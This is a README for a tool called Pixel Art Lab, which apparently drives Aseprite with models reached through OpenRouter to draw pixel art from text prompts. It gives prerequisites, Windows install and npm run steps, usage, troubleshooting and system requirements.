# 🎨 pixel-art-lab - Create pixel art using smart models

[![](https://img.shields.io/badge/Download-Pixel_Art_Lab-blue.svg)](https://github.com/noelleblonde92/pixel-art-lab)

Pixel Art Lab is a tool that helps you create pixel art. It uses artificial intelligence to draw images inside the Aseprite software. You provide a text prompt, and the program uses smart models to create the art for you. The system works by drawing, checking the image, and fixing errors automatically until it matches your request.

## 🛠 Prerequisites

Before you start, make sure you have these programs on your computer:

1. **Aseprite:** You need the Aseprite software installed. The system requires version 1.3.10 or newer. You must have a working copy of Aseprite on your computer before you can use this lab.
2. **Node.js:** This handles the web interface. Download the long-term support version from the official website and install it.
3. **Go:** You need Go version 1.23 or newer to build the background tools.
4. **OpenRouter API Key:** You must have an account with OpenRouter. Copy your unique API key from your account settings. This key allows the app to communicate with the models that draw your art.

## 📥 How to Install

Follow these steps to set up the software on your Windows computer.

1. **Visit the website:** Go to the official [Pixel Art Lab repository page](https://github.com/noelleblonde92/pixel-art-lab) to find the latest version.
2. **Download the code:** Click the green button labeled "Code" and select "Download ZIP". Save the file to your computer.
3. **Unzip the folder:** Right-click the downloaded file and select "Extract All". Choose a folder on your computer where you want to keep the program.
4. **Install components:** Open your command prompt (search for 'cmd' in your start menu). Navigate to the folder you unzipped. Type `npm install` and press Enter. This command downloads the parts needed for the app to run.
5. **Configure settings:** Locate the file named `.env` in the folder. Open it using a text editor like Notepad. Paste your OpenRouter API key into the space provided. Save the file.
6. **Start the app:** In the same command prompt window, type `npm start`. The program will launch in your default web browser.

## 🚀 Creating Your First Piece

Once the application window opens in your browser, you will see a simple control panel. 

1. **Enter a prompt:** Type a description of the art you want. For example, "a small fire animation in pixel art style."
2. **Set your budget:** Choose how much work the model should do. A higher budget allows for more refinement but takes more time.
3. **Watch the process:** The app will send your request to the model. You will see the art appear in the preview window. The system will iterate on the design, making small changes to improve the output based on your prompt.
4. **Save your work:** Once the model completes the task, it will automatically save the file to your Aseprite directory. You can then open the file directly in Aseprite for final touches.

## ⚙️ Troubleshooting

If the application does not start, verify that you have Aseprite open on your computer. The background tool needs to see the Aseprite window to perform its tasks. Ensure that your API key is active. You can check your remaining balance on the OpenRouter dashboard. If you encounter errors during the installation, confirm that your Node.js version is 20 or higher. You can check your version by typing `node -v` in the command prompt.

## 📁 System Requirements

This software runs on Windows 10 and 11. It needs at least 8GB of memory for smooth performance. Keep your GPU drivers updated to help the model process images quickly. A stable internet connection is necessary because the application downloads instructions from the model provider each time you generate new art.

Keywords: pixel-art, generative-art, aseprite, automation, artificial-intelligence